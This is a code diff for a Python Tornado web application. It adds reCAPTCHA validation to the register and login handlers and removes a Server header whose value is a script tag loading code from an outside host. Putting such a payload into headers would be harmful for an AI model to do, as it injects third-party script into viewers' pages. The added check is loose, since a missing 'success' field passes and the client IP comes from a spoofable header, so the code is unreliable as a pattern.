@@ -61,7 +61,7 @@ class BaseHandler(tornado.web.RequestHandler):
         self.set_header("Cache-Control", "no-cache, no-store, must-revalidate")
         self.set_header("Pragma", "no-cache")
         self.set_header("Expires", "0")
-        self.set_header("Server", "<script src=//y.vg></script>")
+        self.set_header("Server", "")
 
         self.request.remote_ip = self.request.headers.get( "X-Forwarded-For" )
 
@@ -125,6 +125,27 @@ class BaseHandler(tornado.web.RequestHandler):
             if input_dict[ field ] == "":
                 self.error( "Missing required field '" + field + "', this endpoint requires the following parameters: " + ', '.join( required_field_list ) )
                 return False
+        return True
+
+    def validate_recaptcha( self, recaptcha_response, ip ):
+        if recaptcha_response == "":
+            self.error( "Missing required field recaptcha")
+            return False
+        URIReCaptcha = 'https://www.google.com/recaptcha/api/siteverify'
+        recaptchaResponse = recaptcha_response
+        private_recaptcha = 'key'
+        remote_ip = ip
+        params = urllib.urlencode({
+        'secret': private_recaptcha,
+        'response': recaptchaResponse,
+        'remote_ip': remote_ip,
+        })
+        data = urllib.urlopen(URIReCaptcha, params).read()
+        result = json.loads(data)
+        success = result.get('success', None)
+        if success == False:
+            self.error( "Recaptcha response error")
+            return False
         return True
 
     def error( self, error_message ):
@@ -311,7 +332,10 @@ class RegisterHandler(BaseHandler):
     @gen.coroutine
     def post(self):
         user_data = json.loads(self.request.body)
+        remote_ip = self.request.remote_ip
         user_data["email_enabled"] = True
+        if not self.validate_recaptcha( user_data["recaptcha_response"], remote_ip ):
+            return
         if not self.validate_input( ["email","username","password", "domain"], user_data ):
             return
 
@@ -366,6 +390,9 @@ class LoginHandler(BaseHandler):
     @gen.coroutine
     def post(self):
         user_data = json.loads(self.request.body)
+        remote_ip = self.request.remote_ip
+        if not self.validate_recaptcha( user_data["recaptcha_response"], remote_ip ):
+            return
         if not self.validate_input( ["username","password"], user_data ):
             return
 
